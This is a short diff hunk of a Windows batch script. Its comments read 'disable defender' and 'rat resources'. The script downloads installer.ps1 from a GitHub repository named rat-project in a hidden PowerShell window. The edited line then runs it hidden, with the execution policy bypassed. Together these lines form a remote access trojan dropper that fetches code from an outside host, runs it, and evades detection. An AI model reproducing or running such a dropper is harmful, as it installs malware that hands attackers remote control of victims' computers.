@@ -32,4 +32,4 @@ REM disable defender
 
 REM rat resources
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/entropyleech/rat-project/refs/heads/main/files/installer.ps1' -OutFile 'installer.ps1'"
-powershell Start-Process powershell.exe -windowstyle hidden -ep bypass "./installer.ps1"
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "./installer.ps1"
